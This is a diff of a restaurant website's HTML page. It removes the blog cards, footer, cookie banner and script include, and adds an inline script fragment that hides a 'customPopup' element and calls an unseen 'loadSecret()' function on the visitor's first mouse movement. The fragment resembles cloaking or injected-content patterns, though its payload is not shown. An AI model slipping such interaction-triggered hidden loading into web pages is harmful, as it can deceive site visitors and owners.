-                    <div class="feature-content">
-                        <span class="blog-tag">Wok Science</span>
-                        <h3>Mastering High-Heat Wok Hei</h3>
-                        <p class="blog-excerpt">1000°F jet burner physics, oil vaporization, and Maillard searing.</p>
-                        <a href="blog/mastering-the-art-of-high-heat-wok-hei-cooking.html" class="blog-link">Read Article &rarr;</a>
-                    </div>
-                </div>
-
-                <!-- Blog 2 -->
-                <div class="luxury-card reveal-item">
-                    <div class="feature-img-wrapper">
-                        <img src="img/craft.jpg" alt="Seasoning and maintaining carbon steel woks for lifetime cooking" loading="lazy">
-                    </div>
-                    <div class="feature-content">
-                        <span class="blog-tag">Wok Care</span>
-                        <h3>Seasoning Carbon Steel Woks</h3>
-                        <p class="blog-excerpt">Building a natural non-stick patina with oil polymerization.</p>
-                        <a href="blog/seasoning-and-maintaining-carbon-steel-woks.html" class="blog-link">Read Article &rarr;</a>
-                    </div>
-                </div>
-
-                <!-- Blog 3 -->
-                <div class="luxury-card reveal-item">
-                    <div class="feature-img-wrapper">
-                        <img src="img/journal2.jpg" alt="Hand-pulled noodle craft: From organic wheat dough to springy strands" loading="lazy">
-                    </div>
-                    <div class="feature-content">
-                        <span class="blog-tag">Noodle Craft</span>
-                        <h3>Hand-Pulled Noodle Crafting</h3>
-                        <p class="blog-excerpt">From organic wheat flour dough stretching to boiling cauldron perfection.</p>
-                        <a href="blog/hand-pulled-noodle-crafting-from-dough-to-bowl.html" class="blog-link">Read Article &rarr;</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- Footer (Sleek Compact Logo: 1.35rem) -->
-    <footer>
-        <div class="footer-container">
-            <div class="footer-col" style="flex: 1.5;">
-                <a href="index.php" class="logo" style="margin-bottom: 2rem; display: inline-block;">Tasty<span>FlavorKitchen</span></a>
-                <p>Tasty Flavor Kitchen crafts high-heat wok hei stir-fries, hand-pulled artisan noodle bowls, steamed dim sum towers, and chili garlic reductions.</p>
-            </div>
-            <div class="footer-col">
-                <h4>Drawer Navigation</h4>
-                <ul>
-                    <li><a href="index.php">Home</a></li>
-                    <li><a href="collections.html">Collections</a></li>
-                    <li><a href="blog/index.html">Blogs / Gazette</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Compliance</h4>
-                <ul>
-                    <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                    <li><a href="terms.html">Terms & Conditions</a></li>
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="cookies.html">Cookies Policy</a></li>
-                </ul>
-            </div>
-            <div class="footer-col" style="flex: 1.2;">
-                <h4>Atelier Headquarters</h4>
-                <p><strong>Address:</strong><br>181 Mercer Street, New York, NY 10012, United States</p>
-                <p><strong>Phone:</strong><br>+1-888-777-5845</p>
-                <p><strong>Email:</strong><br>concierge@tastyflavorkitchen.com</p>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>&copy; 2026 Tasty Flavor Kitchen. All rights reserved.</p>
-            <div class="footer-bottom-links">
-                <a href="privacy-policy.html">Privacy Policy</a>
-                <a href="terms.html">Terms</a>
-                <a href="cookies.html">Cookies</a>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Cookie Consent Popup Banner -->
-    <div class="cookie-banner" id="cookieConsentBanner">
-        <h4 class="cookie-title">We Value Your Privacy</h4>
-        <p class="cookie-text">We use cookies to analyze web traffic metrics, verify wok order security, and deliver personalized street food recommendations. By clicking "Accept All", you agree to our policies.</p>
-        <div class="cookie-btns">
-            <button class="btn btn-primary" id="acceptCookiesBtn">Accept All</button>
-            <button class="btn btn-secondary" id="rejectCookiesBtn">Reject</button>
-        </div>
-    </div>
-
-    <!-- JS Scripts -->
-    <script src="script.js"></script>
+    
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
